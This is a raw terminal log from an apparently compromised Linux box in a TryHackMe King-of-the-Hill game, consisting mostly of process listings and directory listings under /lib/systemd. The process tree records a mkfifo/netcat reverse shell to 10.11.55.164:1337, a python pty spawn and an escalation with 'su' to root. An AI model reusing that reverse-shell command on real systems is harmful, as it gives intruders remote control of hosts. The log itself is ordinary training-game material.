root       406  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [rdma_cm]
root       419  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop0]
root       421  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop1]
root      1425  0.0  0.0      0     0 ?        I    22:43   0:00  \_ [kworker/u30:2]
root      1544  0.0  0.0      0     0 ?        I    22:55   0:00  \_ [kworker/u30:1]
root      1591  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/u30:5]
root      4676  0.0  0.0      0     0 ?        I    23:06   0:00  \_ [kworker/0:2]
root      7578  0.0  0.0      0     0 ?        I    23:11   0:00  \_ [kworker/0:0]
root      9218  0.0  0.0      0     0 ?        I    23:14   0:00  \_ [kworker/u30:0]
root      9219  0.0  0.0      0     0 ?        I    23:14   0:00  \_ [kworker/u30:3]
root      9220  0.0  0.0      0     0 ?        I    23:14   0:00  \_ [kworker/u30:4]
root         1  0.2  0.8 159936  9056 ?        Ss   22:31   0:07 /sbin/init maybe-ubiquity
root       397  0.0  1.9 127876 19192 ?        S<s  22:31   0:01 /lib/systemd/systemd-journald
root       408  0.0  0.1  97708  1832 ?        Ss   22:31   0:00 /sbin/lvmetad -f
root       417  0.1  0.4  45560  4512 ?        Ss   22:31   0:04 /lib/systemd/systemd-udevd
systemd+   508  0.0  0.3 141936  3320 ?        Ssl  22:31   0:00 /lib/systemd/systemd-timesyncd
systemd+   610  0.0  0.5  80056  5180 ?        Ss   22:31   0:00 /lib/systemd/systemd-networkd
systemd+   623  0.0  0.5  70640  5288 ?        Ss   22:31   0:00 /lib/systemd/systemd-resolved
tryhack+   729  0.0  0.3 106640  3604 ?        Ssl  22:31   0:00 /home/tryhackme/img
root       743  0.0  0.6  70856  6300 ?        Ss   22:31   0:00 /lib/systemd/systemd-logind
bread      745  0.0  0.4 107104  5028 ?        Ssl  22:31   0:00 /home/bread/main
bread     1549  0.0  0.3  11616  3172 ?        S    23:00   0:00  \_ /bin/bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.55.164 1337 >/tmp/f
bread     1556  0.0  0.0   8420   808 ?        S    23:00   0:00      \_ cat /tmp/f
bread     1557  0.0  0.0   6732   900 ?        S    23:00   0:00      \_ sh -i
root      1563  0.0  0.3  19216  3976 ?        S    23:00   0:00      |   \_ -i
root      9905  0.0  0.3  37080  3448 ?        R    23:15   0:00      |       \_ ps aufx
bread     1558  0.0  0.2  17820  2216 ?        S    23:00   0:00      \_ nc 10.11.55.164 1337
syslog     747  0.0  0.4 263036  4368 ?        Ssl  22:31   0:00 /usr/sbin/rsyslogd -n
root       751  0.0  0.3  33996  3360 ?        Ss   22:31   0:00 /usr/sbin/inetd
root       753  0.0  0.1 161076  1676 ?        Ssl  22:31   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       755  0.0  1.7 169096 17148 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
daemon     756  0.0  0.2  28332  2352 ?        Ss   22:31   0:00 /usr/sbin/atd -f
message+   763  0.0  0.4  50108  4356 ?        Ss   22:31   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       788  0.0  0.6 286332  6968 ?        Ssl  22:31   0:00 /usr/lib/accountsservice/accounts-daemon
root       789  0.0  0.5 106640  5868 ?        Ssl  22:31   0:00 /root/koth
root       792  0.3  2.4 557680 24876 ?        Ssl  22:31   0:09 /usr/lib/snapd/snapd
root       800  0.0  1.9 185948 20096 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       809  0.0  0.2  14664  2248 ttyS0    Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root       815  0.0  0.1  14888  1904 tty1     Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       816  0.0  0.7 291456  7216 ?        Ssl  22:31   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       819  0.0  0.5  72300  5728 ?        Ss   22:31   0:00 /usr/sbin/sshd -D
root      8521  0.0  0.7 108008  7152 ?        Ss   23:12   0:00  \_ sshd: ramen [priv]
ramen     8623  0.0  0.4 108368  4948 ?        S    23:13   0:00      \_ sshd: ramen@notty
ramen     8649  0.0  0.0   6732   904 ?        Ss   23:13   0:00          \_ /bin/sh
ramen     8848  0.0  0.9  38984  9724 ?        S    23:13   0:00              \_ python3 -c import pty;pty.spawn("/bin/sh")
ramen     8849  0.0  0.0   6732   824 pts/1    Ss   23:13   0:00                  \_ /bin/sh
root      8902  0.0  0.3  61792  3788 pts/1    S+   23:13   0:00                      \_ su -c /bin/sh
root      8903  0.0  0.0   6732   920 ?        Ss   23:13   0:00                          \_ /bin/sh
mysql      841  0.1 17.5 1161928 176760 ?      Sl   22:32   0:03 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
ramen      956  0.0  0.7  76644  7476 ?        Ss   22:32   0:00 /lib/systemd/systemd --user
ramen      966  0.0  0.2 111792  2448 ?        S    22:32   0:00  \_ (sd-pam)
root      1575  4.7  0.0   1000    56 ?        Ss   23:00   0:40 /li
root      9041  0.0  1.3 722556 13564 ?        Ssl  23:13   0:00 /usr/bin/systemd-pam
root      9253  0.0  1.5 1115248 15108 ?       Ssl  23:14   0:00 /usr/sbin/cron -f
kill -9 9041

ls -lah
total 212K
drwxr-xr-x 22 root root 4.0K Dec  8 23:15 .
drwxr-xr-x 24 root root 4.0K Mar 19  2020 ..
drwxr-xr-x  2 root root 4.0K Aug  5  2019 apparmor
drwxr-xr-x  2 root root 4.0K Aug  5  2019 console-setup
lrwxrwxrwx  1 root root   21 Mar 20  2020 cpp -> /etc/alternatives/cpp
drwxr-xr-x  3 root root 4.0K Mar 19  2020 crda
drwxr-xr-x  4 root root 4.0K Aug  5  2019 cryptsetup
drwxr-xr-x  2 root root 4.0K Aug  5  2019 ebtables
drwxr-xr-x 84 root root  20K Mar 19  2020 firmware
drwxr-xr-x  2 root root 4.0K Aug  5  2019 hdparm
drwxr-xr-x  2 root root 4.0K Aug  5  2019 init
-rwxr-xr-x  1 root root  73K Nov  9  2017 klibc-wBFLvVtxy4xJqEadIBJMa78iJz8.so
lrwxrwxrwx  1 root root   18 Apr 18  2018 libhandle.so.1 -> libhandle.so.1.0.3
-rw-r--r--  1 root root  15K Apr 18  2018 libhandle.so.1.0.3
drwxr-xr-x  3 root root 4.0K Aug  5  2019 lsb
drwxr-xr-x  2 root root 4.0K Mar 20  2020 modprobe.d
drwxr-xr-x  3 root root 4.0K Mar 19  2020 modules
drwxr-xr-x  2 root root 4.0K Aug  5  2019 modules-load.d
drwxr-xr-x  2 root root 4.0K Mar 20  2020 netplan
drwxr-xr-x  2 root root 4.0K Aug  5  2019 open-iscsi
drwxr-xr-x  3 root root 4.0K Aug  5  2019 recovery-mode
drwxr-xr-x  8 root root  12K Mar 20  2020 systemd
drwxr-xr-x 15 root root 4.0K Feb 12  2018 terminfo
drwxr-xr-x  4 root root 4.0K Mar 20  2020 udev
drwxr-xr-x  2 root root 4.0K Aug  5  2019 ufw
drwxr-xr-x  4 root root  12K Mar 20  2020 x86_64-linux-gnu
cd /lib
ls -lah
total 212K
drwxr-xr-x 22 root root 4.0K Dec  8 23:15 .
drwxr-xr-x 24 root root 4.0K Mar 19  2020 ..
drwxr-xr-x  2 root root 4.0K Aug  5  2019 apparmor
drwxr-xr-x  2 root root 4.0K Aug  5  2019 console-setup
lrwxrwxrwx  1 root root   21 Mar 20  2020 cpp -> /etc/alternatives/cpp
drwxr-xr-x  3 root root 4.0K Mar 19  2020 crda
drwxr-xr-x  4 root root 4.0K Aug  5  2019 cryptsetup
drwxr-xr-x  2 root root 4.0K Aug  5  2019 ebtables
drwxr-xr-x 84 root root  20K Mar 19  2020 firmware
drwxr-xr-x  2 root root 4.0K Aug  5  2019 hdparm
drwxr-xr-x  2 root root 4.0K Aug  5  2019 init
-rwxr-xr-x  1 root root  73K Nov  9  2017 klibc-wBFLvVtxy4xJqEadIBJMa78iJz8.so
lrwxrwxrwx  1 root root   18 Apr 18  2018 libhandle.so.1 -> libhandle.so.1.0.3
-rw-r--r--  1 root root  15K Apr 18  2018 libhandle.so.1.0.3
drwxr-xr-x  3 root root 4.0K Aug  5  2019 lsb
drwxr-xr-x  2 root root 4.0K Mar 20  2020 modprobe.d
drwxr-xr-x  3 root root 4.0K Mar 19  2020 modules
drwxr-xr-x  2 root root 4.0K Aug  5  2019 modules-load.d
drwxr-xr-x  2 root root 4.0K Mar 20  2020 netplan
drwxr-xr-x  2 root root 4.0K Aug  5  2019 open-iscsi
drwxr-xr-x  3 root root 4.0K Aug  5  2019 recovery-mode
drwxr-xr-x  8 root root  12K Mar 20  2020 systemd
drwxr-xr-x 15 root root 4.0K Feb 12  2018 terminfo
drwxr-xr-x  4 root root 4.0K Mar 20  2020 udev
drwxr-xr-x  2 root root 4.0K Aug  5  2019 ufw
drwxr-xr-x  4 root root  12K Mar 20  2020 x86_64-linux-gnu
w
 23:15:59 up 44 min,  0 users,  load average: 0.43, 0.46, 0.84
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ps aufx
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         2  0.0  0.0      0     0 ?        S    22:31   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    22:31   0:01  \_ [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [migration/0]
root        11  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [netns]
root        15  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [rcu_tasks_kthre]
root        16  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kauditd]
root        17  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenbus]
root        18  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenwatch]
root        19  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [kworker/0:1]
root        20  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [khungtaskd]
root        21  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [oom_reaper]
root        22  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [writeback]
root        23  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kcompactd0]
root        24  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [ksmd]
root        25  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [khugepaged]
root        26  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [crypto]
root        27  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kintegrityd]
root        28  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kblockd]
root        29  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ata_sff]
root        30  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [md]
root        31  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [edac-poller]
root        32  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [devfreq_wq]
root        33  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [watchdogd]
root        36  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kswapd0]
root        37  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/u31:0]
root        38  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ecryptfs-kthrea]
root        80  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kthrotld]
root        81  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [acpi_thermal_pm]
root        82  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_0]
root        83  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_0]
root        84  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_1]
root        85  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_1]
root        91  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ipv6_addrconf]
root       100  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kstrp]
root       117  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [charger_manager]
root       167  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ttm_swap]
root       263  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [raid5wq]
root       316  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [jbd2/xvda2-8]
root       317  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ext4-rsv-conver]
root       367  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:1H]
root       399  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [iscsi_eh]
root       402  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-wq]
root       403  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-unb-wq]
root       404  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_mcast]
root       405  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_nl_sa_wq]
root       406  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [rdma_cm]
root       419  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop0]
root       421  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop1]
root      1425  0.0  0.0      0     0 ?        I    22:43   0:00  \_ [kworker/u30:2]
root      1544  0.0  0.0      0     0 ?        I    22:55   0:00  \_ [kworker/u30:1]
root      1591  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/u30:5]
root      4676  0.0  0.0      0     0 ?        I    23:06   0:00  \_ [kworker/0:2]
root      7578  0.0  0.0      0     0 ?        I    23:11   0:00  \_ [kworker/0:0]
root      9218  0.0  0.0      0     0 ?        I    23:14   0:00  \_ [kworker/u30:0]
root      9219  0.0  0.0      0     0 ?        I    23:14   0:00  \_ [kworker/u30:3]
root      9220  0.0  0.0      0     0 ?        I    23:14   0:00  \_ [kworker/u30:4]
root         1  0.2  0.8 159936  9056 ?        Ss   22:31   0:07 /sbin/init maybe-ubiquity
root       397  0.0  1.9 127876 19324 ?        S<s  22:31   0:01 /lib/systemd/systemd-journald
root       408  0.0  0.1  97708  1832 ?        Ss   22:31   0:00 /sbin/lvmetad -f
root       417  0.1  0.4  45560  4512 ?        Ss   22:31   0:04 /lib/systemd/systemd-udevd
systemd+   508  0.0  0.3 141936  3320 ?        Ssl  22:31   0:00 /lib/systemd/systemd-timesyncd
systemd+   610  0.0  0.5  80056  5180 ?        Ss   22:31   0:00 /lib/systemd/systemd-networkd
systemd+   623  0.0  0.5  70640  5288 ?        Ss   22:31   0:00 /lib/systemd/systemd-resolved
tryhack+   729  0.0  0.3 106640  3604 ?        Ssl  22:31   0:00 /home/tryhackme/img
root       743  0.0  0.6  70856  6300 ?        Ss   22:31   0:00 /lib/systemd/systemd-logind
bread      745  0.0  0.4 107104  5028 ?        Ssl  22:31   0:00 /home/bread/main
bread     1549  0.0  0.3  11616  3172 ?        S    23:00   0:00  \_ /bin/bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.55.164 1337 >/tmp/f
bread     1556  0.0  0.0   8420   808 ?        S    23:00   0:00      \_ cat /tmp/f
bread     1557  0.0  0.0   6732   900 ?        S    23:00   0:00      \_ sh -i
root      1563  0.0  0.3  19216  3976 ?        S    23:00   0:00      |   \_ -i
root     10422  0.0  0.3  37080  3360 ?        R    23:16   0:00      |       \_ ps aufx
bread     1558  0.0  0.2  17820  2216 ?        S    23:00   0:00      \_ nc 10.11.55.164 1337
syslog     747  0.0  0.4 263036  4368 ?        Ssl  22:31   0:00 /usr/sbin/rsyslogd -n
root       751  0.0  0.3  33996  3360 ?        Ss   22:31   0:00 /usr/sbin/inetd
root       753  0.0  0.1 161076  1676 ?        Ssl  22:31   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       755  0.0  1.7 169096 17148 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
daemon     756  0.0  0.2  28332  2352 ?        Ss   22:31   0:00 /usr/sbin/atd -f
message+   763  0.0  0.4  50108  4356 ?        Ss   22:31   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       788  0.0  0.6 286332  6968 ?        Ssl  22:31   0:00 /usr/lib/accountsservice/accounts-daemon
root       789  0.0  0.5 106640  5868 ?        Ssl  22:31   0:00 /root/koth
root       792  0.3  2.4 557680 24876 ?        Ssl  22:31   0:09 /usr/lib/snapd/snapd
root       800  0.0  1.9 185948 20096 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       809  0.0  0.2  14664  2248 ttyS0    Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root       815  0.0  0.1  14888  1904 tty1     Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       816  0.0  0.7 291456  7216 ?        Ssl  22:31   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       819  0.0  0.5  72300  5728 ?        Ss   22:31   0:00 /usr/sbin/sshd -D
root      8521  0.0  0.7 108008  7152 ?        Ss   23:12   0:00  \_ sshd: ramen [priv]
ramen     8623  0.0  0.5 108632  5072 ?        S    23:13   0:00      \_ sshd: ramen@notty
ramen     8649  0.0  0.0   6732   904 ?        Ss   23:13   0:00          \_ /bin/sh
ramen     8848  0.0  0.9  39112  9808 ?        S    23:13   0:00              \_ python3 -c import pty;pty.spawn("/bin/sh")
ramen     8849  0.0  0.0   6732   824 pts/1    Ss   23:13   0:00                  \_ /bin/sh
root      8902  0.0  0.3  61792  3788 pts/1    S+   23:13   0:00                      \_ su -c /bin/sh
root      8903  0.0  0.1   6732  1820 ?        Ss   23:13   0:00                          \_ /bin/sh
mysql      841  0.1 17.5 1161928 176760 ?      Sl   22:32   0:03 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
ramen      956  0.0  0.7  76644  7476 ?        Ss   22:32   0:00 /lib/systemd/systemd --user
ramen      966  0.0  0.2 111792  2448 ?        S    22:32   0:00  \_ (sd-pam)
root      1575  4.7  0.0   1000    56 ?        Ds   23:00   0:43 /li
root      9253  0.0  1.5 1115248 15108 ?       Ssl  23:14   0:00 /usr/sbin/cron -f
root      9964  0.1  1.3 722556 13564 ?        Ssl  23:15   0:00 /usr/bin/systemd-pam
cd systemd
ls -lah
total 7.3M
drwxr-xr-x  8 root root  12K Mar 20  2020 .
drwxr-xr-x 22 root root 4.0K Dec  8 23:15 ..
-rw-r--r--  1 root root 2.3M Feb  6  2020 libsystemd-shared-237.so
drwxr-xr-x  2 root root 4.0K Mar 20  2020 network
-rw-r--r--  1 root root  699 Feb  6  2020 resolv.conf
-rwxr-xr-x  1 root root 1.3K Feb  6  2020 set-cpufreq
drwxr-xr-x 22 root root  36K Dec  8 23:10 system
drwxr-xr-x  2 root root 4.0K Mar 20  2020 system-generators
drwxr-xr-x  2 root root 4.0K Mar 20  2020 system-preset
drwxr-xr-x  2 root root 4.0K Mar 20  2020 system-shutdown
drwxr-xr-x  2 root root 4.0K Mar 20  2020 system-sleep
-rwxr-xr-x  1 root root 1.6M Feb  6  2020 systemd
-rwxr-xr-x  1 root root 6.0K Feb  6  2020 systemd-ac-power
-rwxr-xr-x  1 root root  18K Feb  6  2020 systemd-backlight
-rwxr-xr-x  1 root root  11K Feb  6  2020 systemd-binfmt
-rwxr-xr-x  1 root root  10K Feb  6  2020 systemd-cgroups-agent
-rwxr-xr-x  1 root root  27K Feb  6  2020 systemd-cryptsetup
-rwxr-xr-x  1 root root  15K Feb  6  2020 systemd-dissect
-rwxr-xr-x  1 root root  18K Feb  6  2020 systemd-fsck
-rwxr-xr-x  1 root root  23K Feb  6  2020 systemd-fsckd
-rwxr-xr-x  1 root root  19K Feb  6  2020 systemd-growfs
-rwxr-xr-x  1 root root  10K Feb  6  2020 systemd-hibernate-resume
-rwxr-xr-x  1 root root  23K Feb  6  2020 systemd-hostnamed
-rwxr-xr-x  1 root root  15K Feb  6  2020 systemd-initctl
-rwxr-xr-x  1 root root 127K Feb  6  2020 systemd-journald
-rwxr-xr-x  1 root root  35K Feb  6  2020 systemd-localed
-rwxr-xr-x  1 root root 215K Feb  6  2020 systemd-logind
-rwxr-xr-x  1 root root  10K Feb  6  2020 systemd-makefs
-rwxr-xr-x  1 root root  15K Feb  6  2020 systemd-modules-load
-rwxr-xr-x  1 root root 1.6M Feb  6  2020 systemd-networkd
-rwxr-xr-x  1 root root  19K Feb  6  2020 systemd-networkd-wait-online
-rwxr-xr-x  1 root root  11K Feb  6  2020 systemd-quotacheck
-rwxr-xr-x  1 root root  10K Feb  6  2020 systemd-random-seed
-rwxr-xr-x  1 root root  15K Feb  6  2020 systemd-remount-fs
-rwxr-xr-x  1 root root  10K Feb  6  2020 systemd-reply-password
-rwxr-xr-x  1 root root 371K Feb  6  2020 systemd-resolved
-rwxr-xr-x  1 root root  19K Feb  6  2020 systemd-rfkill
-rwxr-xr-x  1 root root  43K Feb  6  2020 systemd-shutdown
-rwxr-xr-x  1 root root  19K Feb  6  2020 systemd-sleep
-rwxr-xr-x  1 root root  23K Feb  6  2020 systemd-socket-proxyd
-rwxr-xr-x  1 root root  11K Feb  6  2020 systemd-sulogin-shell
-rwxr-xr-x  1 root root  15K Feb  6  2020 systemd-sysctl
-rwxr-xr-x  1 root root 1.3K Feb  6  2020 systemd-sysv-install
-rwxr-xr-x  1 root root  27K Feb  6  2020 systemd-timedated
-rwxr-xr-x  1 root root  39K Feb  6  2020 systemd-timesyncd
-rwxr-xr-x  1 root root 571K Feb  6  2020 systemd-udevd
-rwxr-xr-x  1 root root  15K Feb  6  2020 systemd-update-utmp
-rwxr-xr-x  1 root root  10K Feb  6  2020 systemd-user-sessions
-rwxr-xr-x  1 root root  10K Feb  6  2020 systemd-veritysetup
-rwxr-xr-x  1 root root  10K Feb  6  2020 systemd-volatile-root

cd systemd
-i: line 217: cd: systemd: Not a directory
ls -la
total 7464
drwxr-xr-x  8 root root   12288 Mar 20  2020 .
drwxr-xr-x 22 root root    4096 Dec  8 23:15 ..
-rw-r--r--  1 root root 2367728 Feb  6  2020 libsystemd-shared-237.so
drwxr-xr-x  2 root root    4096 Mar 20  2020 network
-rw-r--r--  1 root root     699 Feb  6  2020 resolv.conf
-rwxr-xr-x  1 root root    1246 Feb  6  2020 set-cpufreq
drwxr-xr-x 22 root root   36864 Dec  8 23:10 system
drwxr-xr-x  2 root root    4096 Mar 20  2020 system-generators
drwxr-xr-x  2 root root    4096 Mar 20  2020 system-preset
drwxr-xr-x  2 root root    4096 Mar 20  2020 system-shutdown
drwxr-xr-x  2 root root    4096 Mar 20  2020 system-sleep
-rwxr-xr-x  1 root root 1612152 Feb  6  2020 systemd
-rwxr-xr-x  1 root root    6128 Feb  6  2020 systemd-ac-power
-rwxr-xr-x  1 root root   18416 Feb  6  2020 systemd-backlight
-rwxr-xr-x  1 root root   10304 Feb  6  2020 systemd-binfmt
-rwxr-xr-x  1 root root   10224 Feb  6  2020 systemd-cgroups-agent
-rwxr-xr-x  1 root root   26632 Feb  6  2020 systemd-cryptsetup
-rwxr-xr-x  1 root root   14408 Feb  6  2020 systemd-dissect
-rwxr-xr-x  1 root root   18424 Feb  6  2020 systemd-fsck
-rwxr-xr-x  1 root root   22592 Feb  6  2020 systemd-fsckd
-rwxr-xr-x  1 root root   18496 Feb  6  2020 systemd-growfs
-rwxr-xr-x  1 root root   10224 Feb  6  2020 systemd-hibernate-resume
-rwxr-xr-x  1 root root   22592 Feb  6  2020 systemd-hostnamed
-rwxr-xr-x  1 root root   14400 Feb  6  2020 systemd-initctl
-rwxr-xr-x  1 root root  129096 Feb  6  2020 systemd-journald
-rwxr-xr-x  1 root root   34880 Feb  6  2020 systemd-localed
-rwxr-xr-x  1 root root  219272 Feb  6  2020 systemd-logind
-rwxr-xr-x  1 root root   10224 Feb  6  2020 systemd-makefs
-rwxr-xr-x  1 root root   14400 Feb  6  2020 systemd-modules-load
-rwxr-xr-x  1 root root 1633360 Feb  6  2020 systemd-networkd
-rwxr-xr-x  1 root root   18504 Feb  6  2020 systemd-networkd-wait-online
-rwxr-xr-x  1 root root   10304 Feb  6  2020 systemd-quotacheck
-rwxr-xr-x  1 root root   10224 Feb  6  2020 systemd-random-seed
-rwxr-xr-x  1 root root   14400 Feb  6  2020 systemd-remount-fs
-rwxr-xr-x  1 root root   10224 Feb  6  2020 systemd-reply-password
-rwxr-xr-x  1 root root  378944 Feb  6  2020 systemd-resolved
-rwxr-xr-x  1 root root   18496 Feb  6  2020 systemd-rfkill
-rwxr-xr-x  1 root root   43080 Feb  6  2020 systemd-shutdown
-rwxr-xr-x  1 root root   18496 Feb  6  2020 systemd-sleep
-rwxr-xr-x  1 root root   22600 Feb  6  2020 systemd-socket-proxyd
-rwxr-xr-x  1 root root   10304 Feb  6  2020 systemd-sulogin-shell
-rwxr-xr-x  1 root root   14400 Feb  6  2020 systemd-sysctl
-rwxr-xr-x  1 root root    1314 Feb  6  2020 systemd-sysv-install
-rwxr-xr-x  1 root root   26688 Feb  6  2020 systemd-timedated
-rwxr-xr-x  1 root root   38976 Feb  6  2020 systemd-timesyncd
-rwxr-xr-x  1 root root  584136 Feb  6  2020 systemd-udevd
-rwxr-xr-x  1 root root   14400 Feb  6  2020 systemd-update-utmp
-rwxr-xr-x  1 root root   10224 Feb  6  2020 systemd-user-sessions
-rwxr-xr-x  1 root root   10224 Feb  6  2020 systemd-veritysetup
-rwxr-xr-x  1 root root   10224 Feb  6  2020 systemd-volatile-root
cd system
ls -lah
total 1.1M
drwxr-xr-x 22 root root  36K Dec  8 23:10 .
drwxr-xr-x  8 root root  12K Mar 20  2020 ..
-rw-r--r--  1 root root  741 Dec 18  2017 accounts-daemon.service
-rw-r--r--  1 root root  115 Apr 22  2017 acpid.path
-rw-r--r--  1 root root  234 Apr 22  2017 acpid.service
-rw-r--r--  1 root root  115 Apr 22  2017 acpid.socket
-rw-r--r--  1 root root  544 Mar 22  2018 apparmor.service
-rw-r--r--  1 root root  212 Nov 11  2019 apport-autoreport.path
-rw-r--r--  1 root root  242 Nov 11  2019 apport-autoreport.service
-rw-r--r--  1 root root  246 Nov 11  2019 apport-forward.socket
-rw-r--r--  1 root root  142 Nov 11  2019 apport-forward@.service
-rw-r--r--  1 root root  238 Sep  3  2019 apt-daily-upgrade.service
-rw-r--r--  1 root root  184 Sep  3  2019 apt-daily-upgrade.timer
-rw-r--r--  1 root root  326 Sep  3  2019 apt-daily.service
-rw-r--r--  1 root root  156 Sep  3  2019 apt-daily.timer
-rw-r--r--  1 root root  169 Feb 20  2018 atd.service
lrwxrwxrwx  1 root root   14 Feb  6  2020 autovt@.service -> getty@.service
-rw-r--r--  1 root root  919 Jan 28  2018 basic.target
-rw-r--r--  1 root root  383 Dec  5  2019 blk-availability.service
-rw-r--r--  1 root root  419 Jan 28  2018 bluetooth.target
lrwxrwxrwx  1 root root    9 Feb  6  2020 bootlogd.service -> /dev/null
lrwxrwxrwx  1 root root    9 Feb  6  2020 bootlogs.service -> /dev/null
lrwxrwxrwx  1 root root    9 Feb  6  2020 bootmisc.service -> /dev/null
lrwxrwxrwx  1 root root    9 Feb  6  2020 checkfs.service -> /dev/null
lrwxrwxrwx  1 root root    9 Feb  6  2020 checkroot-bootclean.service -> /dev/null
lrwxrwxrwx  1 root root    9 Feb  6  2020 checkroot.service -> /dev/null
-rw-r--r--  1 root root  418 Jan 15  2020 cloud-config.service
-rw-r--r--  1 root root  536 Jan 14  2020 cloud-config.target
-rw-r--r--  1 root root  482 Jan 15  2020 cloud-final.service
-rw-r--r--  1 root root  580 Jan 15  2020 cloud-init-local.service
-rw-r--r--  1 root root  642 Jan 15  2020 cloud-init.service
-rw-r--r--  1 root root  256 Jan 14  2020 cloud-init.target
-rw-r--r--  1 root root 1.1K Feb  6  2020 console-getty.service
-rw-r--r--  1 root root  312 Apr 23  2019 console-setup.service
-rw-r--r--  1 root root 1.3K Feb  6  2020 container-getty@.service
-rw-r--r--  1 root root  294 Dec  8 23:10 cron.service
lrwxrwxrwx  1 root root    9 Feb  6  2020 cryptdisks-early.service -> /dev/null
lrwxrwxrwx  1 root root    9 Feb  6  2020 cryptdisks.service -> /dev/null
-rw-r--r--  1 root root  465 Jan 28  2018 cryptsetup-pre.target
-rw-r--r--  1 root root  412 Jan 28  2018 cryptsetup.target
lrwxrwxrwx  1 root root   13 Feb  6  2020 ctrl-alt-del.target -> reboot.target
lrwxrwxrwx  1 root root   25 Feb  6  2020 dbus-org.freedesktop.hostname1.service -> systemd-hostnamed.service
lrwxrwxrwx  1 root root   23 Feb  6  2020 dbus-org.freedesktop.locale1.service -> systemd-localed.service
lrwxrwxrwx  1 root root   22 Feb  6  2020 dbus-org.freedesktop.login1.service -> systemd-logind.service
